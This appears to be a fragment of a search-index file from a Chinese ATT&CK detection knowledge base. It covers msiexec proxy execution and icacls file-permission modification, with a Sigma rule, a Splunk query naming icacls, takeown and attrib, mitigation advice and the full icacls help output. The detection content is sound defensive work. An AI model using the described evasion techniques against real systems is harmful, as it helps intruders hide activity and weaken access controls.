https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 New Process Name: 'msiexec .exe' #Application Name Commanline: - '/q' - '/y' - '/i' \u200b condition: selection level: low","title":"Sigma\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_6","text":"\u4f7f\u7528\u8fdb\u7a0b\u76d1\u63a7\u6765\u76d1\u89c6msiexec.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u5c06msiexec.exe\u7684\u6700\u8fd1\u8c03\u7528\u4e0e\u5df2\u77e5\u826f\u597d\u81ea\u53d8\u91cf\u548c\u6267\u884c\u7684MSI\u6587\u4ef6\u6216DLL\u7684\u5148\u524d\u5386\u53f2\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u786e\u5b9a\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u5bf9\u6297\u6d3b\u52a8\u3002\u5728\u8c03\u7528msiexec.exe\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u5728\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684MSI\u6587\u4ef6\u6216DLL\u7684\u6765\u6e90\u548c\u7528\u9014\u65b9\u9762\u4e5f\u53ef\u80fd\u5f88\u6709\u7528\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_7","text":"\u7981\u7528\u6216\u5220\u9664\u529f\u80fd\u6216\u7a0b\u5e8f\uff1a\u5c06Msiexec.exe\u7684\u6267\u884c\u9650\u5236\u4e3a\u9700\u8981\u4f7f\u7528\u5b83\u7684\u7279\u6743\u5e10\u6237\u6216\u7ec4\uff0c\u4ee5\u51cf\u5c11\u6076\u610f\u4f7f\u7528\u7684\u673a\u4f1a\u3002 \u7279\u6743\u8d26\u6237\u7ba1\u7406\uff1a\u5c06Msiexec.exe\u7684\u6267\u884c\u9650\u5236\u4e3a\u9700\u8981\u4f7f\u7528\u5b83\u7684\u7279\u6743\u5e10\u6237\u6216\u7ec4\uff0c\u4ee5\u51cf\u5c11\u6076\u610f\u4f7f\u7528\u7684\u673a\u4f1a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_8","text":"MITRE-ATT&CK-T1070-007 https://attack.mitre.org/techniques/T1218/007/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/","text":"T1222-001-win-\u6587\u4ef6\u6743\u9650\u4fee\u6539 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u6587\u4ef6\u548c\u76ee\u5f55\u6743\u9650\u901a\u5e38\u7531\u6587\u4ef6\u6216\u76ee\u5f55\u6240\u6709\u8005\u6307\u5b9a\u7684\u4efb\u610f\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08DACL\uff09\u7ba1\u7406\u3002\u6587\u4ef6\u548c\u76ee\u5f55DACL\u7684\u5b9e\u73b0\u56e0\u5e73\u53f0\u800c\u5f02\uff0c\u4f46\u901a\u5e38\u4f1a\u660e\u786e\u6307\u5b9a\u5b83\u4eec\uff0c\u4ee5\u4fbf\u7528\u6237/\u7ec4\u53ef\u4ee5\u6267\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\u8bfb\u53d6\uff0c\u5199\u5165\uff0c\u6267\u884c\u7b49\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u6216\u5c5e\u6027\uff0c\u4ee5\u9003\u907f\u9884\u671f\u7684DACL\u3002\u4fee\u6539\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6240\u6709\u6743\u6216\u63d0\u5347\u7684\u6743\u9650\uff08\u4f8b\u5982Administrator/root\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u73b0\u6709\u6743\u9650\u4ee5\u542f\u7528\u6076\u610f\u6d3b\u52a8\uff0c\u4f8b\u5982\u4fee\u6539\uff0c\u66ff\u6362\u6216\u5220\u9664\u7279\u5b9a\u6587\u4ef6\u76ee\u5f55\u3002\u7279\u5b9a\u6587\u4ef6\u548c\u76ee\u5f55\u4fee\u6539\u53ef\u80fd\u662f\u8bb8\u591a\u6280\u672f\u6240\u5fc5\u9700\u7684\u6b65\u9aa4\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u53ef\u8bbf\u95ee\u6027\u529f\u80fd\uff0c\u767b\u5f55\u811a\u672c\u5efa\u7acb\u6301\u4e45\u6027\uff0c\u6216\u6c61\u67d3\u3001\u52ab\u6301\u5176\u4ed6\u5de5\u5177\u4e8c\u8fdb\u5236\u914d\u7f6e\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b Icacls \u662f\u4e00\u79cd\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u663e\u793a\u6216\u4fee\u6539\u6307\u5b9a\u6587\u4ef6\u4e0a\u7684\u968f\u673a\u8bbf\u95ee\u63a7\u5236\u5217\u8868 (DACL)\uff0c\u5e76\u5c06\u5b58\u50a8\u7684 DACL \u5e94\u7528\u4e8e\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002Icacls.exe\u66ff\u6362\u4e86Cacls.exe \u5de5\u5177\u7528\u4e8e\u67e5\u770b\u548c\u7f16\u8f91DACL\u3002ICACLS\u662fWindows Server 2003 SP2\u4e2dCACLS\u5de5\u5177\u7684\u5347\u7ea7\u7248\u672c\uff0c\u53ef\u7528\u4e8e\u4ece\u6062\u590d\u63a7\u5236\u53f0\u91cd\u8bbe\u6587\u4ef6\u4e2d\u7684\u5e10\u6237\u63a7\u5236\u5217\u8868 (ACL) \u4ee5\u53ca\u5907\u4efdACL\u3002\u4e0eCACLS\u4e0d\u540c\u7684\u662f\uff0cICACLS\u53ef\u4ee5\u6b63\u786e\u5730\u4f20\u9001\u5bf9\u7ee7\u627f\u7684ACL\u7684\u66f4\u6539\u548c\u521b\u5efa\u3002\u6709ICACLS\u7684\u4f7f\u7528\u53ca\u547d\u4ee4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u8fd0\u884c\u201cicacls /?\u201d\u8fdb\u884c\u8bbf\u95ee\u3002\u8fd9\u91cc\u7684I\u5e94\u8be5\u662fImproved upgrade of cacls. \u68c0\u6d4b\u65e5\u5fd7 windows security windows sysmon \u6d4b\u8bd5\u590d\u73b0 \u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4f60\u9700\u8981\u5728cmd\u6216powershell\u4e2d\u8c03\u7528\u5b83\u3002 Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>icacls ICACLS name /save aclfile [/T] [/C] [/L] [/Q] \u5c06\u5339\u914d\u540d\u79f0\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684 DACL \u5b58\u50a8\u5230 aclfile \u4e2d\u4ee5\u4fbf\u5c06\u6765\u4e0e /restore \u4e00\u8d77\u4f7f\u7528\u3002\u8bf7\u6ce8\u610f\uff0c\u672a\u4fdd\u5b58 SACL\u3001\u6240\u6709\u8005\u6216\u5b8c\u6574\u6027\u6807\u7b7e\u3002 ICACLS directory [/substitute SidOld SidNew [...]] /restore aclfile [/C] [/L] [/Q] \u5c06\u5b58\u50a8\u7684 DACL \u5e94\u7528\u4e8e\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002 ICACLS name /setowner user [/T] [/C] [/L] [/Q] \u66f4\u6539\u6240\u6709\u5339\u914d\u540d\u79f0\u7684\u6240\u6709\u8005\u3002\u8be5\u9009\u9879\u4e0d\u4f1a\u5f3a\u5236\u66f4\u6539\u6240\u6709\u8eab\u4efd\uff1b \u4f7f\u7528 takeown.exe \u5b9e\u7528\u7a0b\u5e8f\u53ef\u5b9e\u73b0\u8be5\u76ee\u7684\u3002 ICACLS name /findsid Sid [/T] [/C] [/L] [/Q] \u67e5\u627e\u5305\u542b\u663e\u5f0f\u63d0\u53ca SID \u7684 ACL \u7684\u6240\u6709\u5339\u914d\u540d\u79f0\u3002 ICACLS name /verify [/T] [/C] [/L] [/Q] \u67e5\u627e\u5176 ACL \u4e0d\u89c4\u8303\u6216\u957f\u5ea6\u4e0e ACE \u8ba1\u6570\u4e0d\u4e00\u81f4\u7684\u6240\u6709\u6587\u4ef6\u3002 ICACLS name /reset [/T] [/C] [/L] [/Q] \u4e3a\u6240\u6709\u5339\u914d\u6587\u4ef6\u4f7f\u7528\u9ed8\u8ba4\u7ee7\u627f\u7684 ACL \u66ff\u6362 ACL\u3002 ICACLS name [/grant[:r] Sid:perm[...]] [/deny Sid:perm [...]] [/remove[:g|:d]] Sid[...]] [/T] [/C] [/L] [/setintegritylevel Level:policy[...]] /grant[:r] Sid:perm \u6388\u4e88\u6307\u5b9a\u7684\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002\u5982\u679c\u4f7f\u7528 :r\uff0c \u8fd9\u4e9b\u6743\u9650\u5c06\u66ff\u6362\u4ee5\u524d\u6388\u4e88\u7684\u6240\u6709\u663e\u5f0f\u6743\u9650\u3002 \u5982\u679c\u4e0d\u4f7f\u7528 :r\uff0c\u8fd9\u4e9b\u6743\u9650\u5c06\u6dfb\u52a0\u5230\u4ee5\u524d\u6388\u4e88\u7684\u6240\u6709\u663e\u5f0f\u6743\u9650\u3002 /deny Sid:perm \u663e\u5f0f\u62d2\u7edd\u6307\u5b9a\u7684\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002 \u5c06\u4e3a\u5217\u51fa\u7684\u6743\u9650\u6dfb\u52a0\u663e\u5f0f\u62d2\u7edd ACE\uff0c \u5e76\u5220\u9664\u6240\u6709\u663e\u5f0f\u6388\u4e88\u7684\u6743\u9650\u4e2d\u7684\u76f8\u540c\u6743\u9650\u3002 /remove[:[g|d]] Sid \u5220\u9664 ACL \u4e2d\u6240\u6709\u51fa\u73b0\u7684 SID\u3002\u4f7f\u7528 :g\uff0c\u5c06\u5220\u9664\u6388\u4e88\u8be5 SID \u7684\u6240\u6709\u6743\u9650\u3002\u4f7f\u7528 :d\uff0c\u5c06\u5220\u9664\u62d2\u7edd\u8be5 SID \u7684\u6240\u6709\u6743\u9650\u3002 /setintegritylevel [(CI)(OI)] \u7ea7\u522b\u5c06\u5b8c\u6574\u6027 ACE \u663e\u5f0f\u6dfb\u52a0\u5230\u6240\u6709 \u5339\u914d\u6587\u4ef6\u3002\u8981\u6307\u5b9a\u7684\u7ea7\u522b\u4e3a\u4ee5\u4e0b\u7ea7\u522b\u4e4b\u4e00: L[ow] M[edium] H[igh] \u5b8c\u6574\u6027 ACE \u7684\u7ee7\u627f\u9009\u9879\u53ef\u4ee5\u4f18\u5148\u4e8e\u7ea7\u522b\uff0c\u4f46\u53ea\u5e94\u7528\u4e8e \u76ee\u5f55\u3002 /inheritance:e|d|r e - \u542f\u7528\u7ee7\u627f d - \u7981\u7528\u7ee7\u627f\u5e76\u590d\u5236 ACE r - \u5220\u9664\u6240\u6709\u7ee7\u627f\u7684 ACE \u6ce8\u610f: Sid \u53ef\u4ee5\u91c7\u7528\u6570\u5b57\u683c\u5f0f\u6216\u53cb\u597d\u7684\u540d\u79f0\u683c\u5f0f\u3002\u5982\u679c\u7ed9\u5b9a\u6570\u5b57\u683c\u5f0f\uff0c \u90a3\u4e48\u8bf7\u5728 SID \u7684\u5f00\u5934\u6dfb\u52a0\u4e00\u4e2a *\u3002</p> <p> /T \u6307\u793a\u5728\u4ee5\u8be5\u540d\u79f0\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u5339\u914d\u6587\u4ef6/\u76ee\u5f55\u4e0a \u6267\u884c\u6b64\u64cd\u4f5c\u3002ICACLS \u4fdd\u7559 ACE \u9879\u7684\u89c4\u8303\u987a\u5e8f: \u663e\u5f0f\u62d2\u7edd \u663e\u5f0f\u6388\u4e88 \u7ee7\u627f\u7684\u62d2\u7edd \u7ee7\u627f\u7684\u6388\u4e88 perm \u662f\u6743\u9650\u63a9\u7801\uff0c\u53ef\u4ee5\u4e24\u79cd\u683c\u5f0f\u4e4b\u4e00\u6307\u5b9a: \u7b80\u5355\u6743\u9650\u5e8f\u5217: N - \u65e0\u8bbf\u95ee\u6743\u9650 F - \u5b8c\u5168\u8bbf\u95ee\u6743\u9650 M - \u4fee\u6539\u6743\u9650 RX - \u8bfb\u53d6\u548c\u6267\u884c\u6743\u9650 R - \u53ea\u8bfb\u6743\u9650 W - \u53ea\u5199\u6743\u9650 D - \u5220\u9664\u6743\u9650 \u5728\u62ec\u53f7\u4e2d\u4ee5\u9017\u53f7\u5206\u9694\u7684\u7279\u5b9a\u6743\u9650\u5217\u8868: DE - \u5220\u9664 RC - \u8bfb\u53d6\u63a7\u5236 WDAC - \u5199\u5165 DAC WO - \u5199\u5165\u6240\u6709\u8005 S - \u540c\u6b65 AS - \u8bbf\u95ee\u7cfb\u7edf\u5b89\u5168\u6027 MA - \u5141\u8bb8\u7684\u6700\u5927\u503c GR - \u4e00\u822c\u6027\u8bfb\u53d6 GW - \u4e00\u822c\u6027\u5199\u5165 GE - \u4e00\u822c\u6027\u6267\u884c GA - \u5168\u4e3a\u4e00\u822c\u6027 RD - \u8bfb\u53d6\u6570\u636e/\u5217\u51fa\u76ee\u5f55 WD - \u5199\u5165\u6570\u636e/\u6dfb\u52a0\u6587\u4ef6 AD - \u9644\u52a0\u6570\u636e/\u6dfb\u52a0\u5b50\u76ee\u5f55 REA - \u8bfb\u53d6\u6269\u5c55\u5c5e\u6027 WEA - \u5199\u5165\u6269\u5c55\u5c5e\u6027 X - \u6267\u884c/\u904d\u5386 DC - \u5220\u9664\u5b50\u9879 RA - \u8bfb\u53d6\u5c5e\u6027 WA - \u5199\u5165\u5c5e\u6027 \u7ee7\u627f\u6743\u9650\u53ef\u4ee5\u4f18\u5148\u4e8e\u6bcf\u79cd\u683c\u5f0f\uff0c\u4f46\u53ea\u5e94\u7528\u4e8e \u76ee\u5f55: (OI) - \u5bf9\u8c61\u7ee7\u627f (CI) - \u5bb9\u5668\u7ee7\u627f (IO) - \u4ec5\u7ee7\u627f (NP) - \u4e0d\u4f20\u64ad\u7ee7\u627f (I) - \u4ece\u7236\u5bb9\u5668\u7ee7\u627f\u7684\u6743\u9650 \u793a\u4f8b: icacls c:\\windows\\* /save AclFile /T - \u5c06 c:\\windows \u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u7684 ACL \u4fdd\u5b58\u5230 AclFile\u3002 icacls c:\\windows\\ /restore AclFile - \u5c06\u8fd8\u539f c:\\windows \u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u5b58\u5728\u7684 AclFile \u5185 \u6240\u6709\u6587\u4ef6\u7684 ACL\u3002 icacls file /grant Administrator:(D,WDAC) - \u5c06\u6388\u4e88\u7528\u6237\u5bf9\u6587\u4ef6\u5220\u9664\u548c\u5199\u5165 DAC \u7684\u7ba1\u7406\u5458\u6743\u9650\u3002 icacls file /grant *S-1-1-0:(D,WDAC) - \u5c06\u6388\u4e88\u7531 sid S-1-1-0 \u5b9a\u4e49\u7684\u7528\u6237\u5bf9\u6587\u4ef6\u5220\u9664\u548c\u5199\u5165 DAC \u7684\u6743\u9650\u3002 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u76d1\u89c6\u5e76\u8c03\u67e5\u4fee\u6539ACL\u548c\u6587\u4ef6\u6216\u76ee\u5f55\u6240\u6709\u6743\u7684\u5c1d\u8bd5\u3002\u8bb8\u591a\u7528\u4e8e\u4fee\u6539ACL\u548c\u6587\u4ef6/\u76ee\u5f55\u6240\u6709\u6743\u7684\u547d\u4ee4\u662f\u5185\u7f6e\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4ea7\u751f\u5f88\u9ad8\u7684\u8bef\u62a5\u7387\uff0c\u56e0\u6b64\uff0c\u8bf7\u4e0e\u57fa\u51c6\u77e5\u8bc6\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u4e86\u89e3\u901a\u5e38\u5982\u4f55\u4f7f\u7528\u7cfb\u7edf\u5e76\u5c06\u4fee\u6539\u4e8b\u4ef6\u4e0e\u5176\u4ed6\u6076\u610f\u6d3b\u52a8\u6307\u793a\u76f8\u5173\u8054\u5728\u53ef\u80fd\u7684\u60c5\u51b5\u3002 \u8003\u8651\u5bf9\u5305\u542b\u5173\u952e\u4e8c\u8fdb\u5236\u6587\u4ef6/\u914d\u7f6e\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u542f\u7528\u6587\u4ef6/\u76ee\u5f55\u6743\u9650\u66f4\u6539\u5ba1\u6838\u3002\u4f8b\u5982\uff0c\u4fee\u6539DACL\u65f6\u4f1a\u521b\u5efaWindows\u5b89\u5168\u65e5\u5fd7\u4e8b\u4ef6\uff08\u4e8b\u4ef6ID 4670\uff09 splunk\u89c4\u5219 index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image IN (\u201c*\\\\icacls.exe\u201d , \u201c*\\\\takeown.exe\u201d , \u201c*\\\\attrib.exe\u201d)) OR (EventCode=1 CommandLine=\u201d*/grant*\u201d) //File and Folder permission modification \u5efa\u8bae \u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1222-001 https://attack.mitre.org/techniques/T1222/001/ windows\u4e2d\u4f7f\u7528icacls\u547d\u4ee4\u8fd8\u539f\u6587\u4ef6\u5939\u7684\u6743\u9650\u8bbe\u7f6e https://www.jb51.net/os/windows/155450.html","title":"T1222-001-win-\u6587\u4ef6\u6743\u9650\u4fee\u6539"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#t1222-001-win-","text":"","title":"T1222-001-win-\u6587\u4ef6\u6743\u9650\u4fee\u6539"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#attck","text":"\u6587\u4ef6\u548c\u76ee\u5f55\u6743\u9650\u901a\u5e38\u7531\u6587\u4ef6\u6216\u76ee\u5f55\u6240\u6709\u8005\u6307\u5b9a\u7684\u4efb\u610f\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08DACL\uff09\u7ba1\u7406\u3002\u6587\u4ef6\u548c\u76ee\u5f55DACL\u7684\u5b9e\u73b0\u56e0\u5e73\u53f0\u800c\u5f02\uff0c\u4f46\u901a\u5e38\u4f1a\u660e\u786e\u6307\u5b9a\u5b83\u4eec\uff0c\u4ee5\u4fbf\u7528\u6237/\u7ec4\u53ef\u4ee5\u6267\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\u8bfb\u53d6\uff0c\u5199\u5165\uff0c\u6267\u884c\u7b49\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u6216\u5c5e\u6027\uff0c\u4ee5\u9003\u907f\u9884\u671f\u7684DACL\u3002\u4fee\u6539\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6240\u6709\u6743\u6216\u63d0\u5347\u7684\u6743\u9650\uff08\u4f8b\u5982Administrator/root\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u73b0\u6709\u6743\u9650\u4ee5\u542f\u7528\u6076\u610f\u6d3b\u52a8\uff0c\u4f8b\u5982\u4fee\u6539\uff0c\u66ff\u6362\u6216\u5220\u9664\u7279\u5b9a\u6587\u4ef6\u76ee\u5f55\u3002\u7279\u5b9a\u6587\u4ef6\u548c\u76ee\u5f55\u4fee\u6539\u53ef\u80fd\u662f\u8bb8\u591a\u6280\u672f\u6240\u5fc5\u9700\u7684\u6b65\u9aa4\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u53ef\u8bbf\u95ee\u6027\u529f\u80fd\uff0c\u767b\u5f55\u811a\u672c\u5efa\u7acb\u6301\u4e45\u6027\uff0c\u6216\u6c61\u67d3\u3001\u52ab\u6301\u5176\u4ed6\u5de5\u5177\u4e8c\u8fdb\u5236\u914d\u7f6e\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_1","text":"Icacls \u662f\u4e00\u79cd\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u663e\u793a\u6216\u4fee\u6539\u6307\u5b9a\u6587\u4ef6\u4e0a\u7684\u968f\u673a\u8bbf\u95ee\u63a7\u5236\u5217\u8868 (DACL)\uff0c\u5e76\u5c06\u5b58\u50a8\u7684 DACL \u5e94\u7528\u4e8e\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002Icacls.exe\u66ff\u6362\u4e86Cacls.exe \u5de5\u5177\u7528\u4e8e\u67e5\u770b\u548c\u7f16\u8f91DACL\u3002ICACLS\u662fWindows Server 2003 SP2\u4e2dCACLS\u5de5\u5177\u7684\u5347\u7ea7\u7248\u672c\uff0c\u53ef\u7528\u4e8e\u4ece\u6062\u590d\u63a7\u5236\u53f0\u91cd\u8bbe\u6587\u4ef6\u4e2d\u7684\u5e10\u6237\u63a7\u5236\u5217\u8868 (ACL) \u4ee5\u53ca\u5907\u4efdACL\u3002\u4e0eCACLS\u4e0d\u540c\u7684\u662f\uff0cICACLS\u53ef\u4ee5\u6b63\u786e\u5730\u4f20\u9001\u5bf9\u7ee7\u627f\u7684ACL\u7684\u66f4\u6539\u548c\u521b\u5efa\u3002\u6709ICACLS\u7684\u4f7f\u7528\u53ca\u547d\u4ee4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u8fd0\u884c\u201cicacls /?\u201d\u8fdb\u884c\u8bbf\u95ee\u3002\u8fd9\u91cc\u7684I\u5e94\u8be5\u662fImproved upgrade of cacls.","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_2","text":"windows security windows sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_3","text":"\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4f60\u9700\u8981\u5728cmd\u6216powershell\u4e2d\u8c03\u7528\u5b83\u3002 Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>icacls ICACLS name /save aclfile [/T] [/C] [/L] [/Q] \u5c06\u5339\u914d\u540d\u79f0\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684 DACL \u5b58\u50a8\u5230 aclfile \u4e2d\u4ee5\u4fbf\u5c06\u6765\u4e0e /restore \u4e00\u8d77\u4f7f\u7528\u3002\u8bf7\u6ce8\u610f\uff0c\u672a\u4fdd\u5b58 SACL\u3001\u6240\u6709\u8005\u6216\u5b8c\u6574\u6027\u6807\u7b7e\u3002 ICACLS directory [/substitute SidOld SidNew [...]] /restore aclfile [/C] [/L] [/Q] \u5c06\u5b58\u50a8\u7684 DACL \u5e94\u7528\u4e8e\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002 ICACLS name /setowner user [/T] [/C] [/L] [/Q] \u66f4\u6539\u6240\u6709\u5339\u914d\u540d\u79f0\u7684\u6240\u6709\u8005\u3002\u8be5\u9009\u9879\u4e0d\u4f1a\u5f3a\u5236\u66f4\u6539\u6240\u6709\u8eab\u4efd\uff1b \u4f7f\u7528 takeown.exe \u5b9e\u7528\u7a0b\u5e8f\u53ef\u5b9e\u73b0\u8be5\u76ee\u7684\u3002 ICACLS name /findsid Sid [/T] [/C] [/L] [/Q] \u67e5\u627e\u5305\u542b\u663e\u5f0f\u63d0\u53ca SID \u7684 ACL \u7684\u6240\u6709\u5339\u914d\u540d\u79f0\u3002 ICACLS name /verify [/T] [/C] [/L] [/Q] \u67e5\u627e\u5176 ACL \u4e0d\u89c4\u8303\u6216\u957f\u5ea6\u4e0e ACE \u8ba1\u6570\u4e0d\u4e00\u81f4\u7684\u6240\u6709\u6587\u4ef6\u3002 ICACLS name /reset [/T] [/C] [/L] [/Q] \u4e3a\u6240\u6709\u5339\u914d\u6587\u4ef6\u4f7f\u7528\u9ed8\u8ba4\u7ee7\u627f\u7684 ACL \u66ff\u6362 ACL\u3002 ICACLS name [/grant[:r] Sid:perm[...]] [/deny Sid:perm [...]] [/remove[:g|:d]] Sid[...]] [/T] [/C] [/L] [/setintegritylevel Level:policy[...]] /grant[:r] Sid:perm \u6388\u4e88\u6307\u5b9a\u7684\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002\u5982\u679c\u4f7f\u7528 :r\uff0c \u8fd9\u4e9b\u6743\u9650\u5c06\u66ff\u6362\u4ee5\u524d\u6388\u4e88\u7684\u6240\u6709\u663e\u5f0f\u6743\u9650\u3002 \u5982\u679c\u4e0d\u4f7f\u7528 :r\uff0c\u8fd9\u4e9b\u6743\u9650\u5c06\u6dfb\u52a0\u5230\u4ee5\u524d\u6388\u4e88\u7684\u6240\u6709\u663e\u5f0f\u6743\u9650\u3002 /deny Sid:perm \u663e\u5f0f\u62d2\u7edd\u6307\u5b9a\u7684\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002 \u5c06\u4e3a\u5217\u51fa\u7684\u6743\u9650\u6dfb\u52a0\u663e\u5f0f\u62d2\u7edd ACE\uff0c \u5e76\u5220\u9664\u6240\u6709\u663e\u5f0f\u6388\u4e88\u7684\u6743\u9650\u4e2d\u7684\u76f8\u540c\u6743\u9650\u3002 /remove[:[g|d]] Sid \u5220\u9664 ACL \u4e2d\u6240\u6709\u51fa\u73b0\u7684 SID\u3002\u4f7f\u7528 :g\uff0c\u5c06\u5220\u9664\u6388\u4e88\u8be5 SID \u7684\u6240\u6709\u6743\u9650\u3002\u4f7f\u7528 :d\uff0c\u5c06\u5220\u9664\u62d2\u7edd\u8be5 SID \u7684\u6240\u6709\u6743\u9650\u3002 /setintegritylevel [(CI)(OI)] \u7ea7\u522b\u5c06\u5b8c\u6574\u6027 ACE \u663e\u5f0f\u6dfb\u52a0\u5230\u6240\u6709 \u5339\u914d\u6587\u4ef6\u3002\u8981\u6307\u5b9a\u7684\u7ea7\u522b\u4e3a\u4ee5\u4e0b\u7ea7\u522b\u4e4b\u4e00: L[ow] M[edium] H[igh] \u5b8c\u6574\u6027 ACE 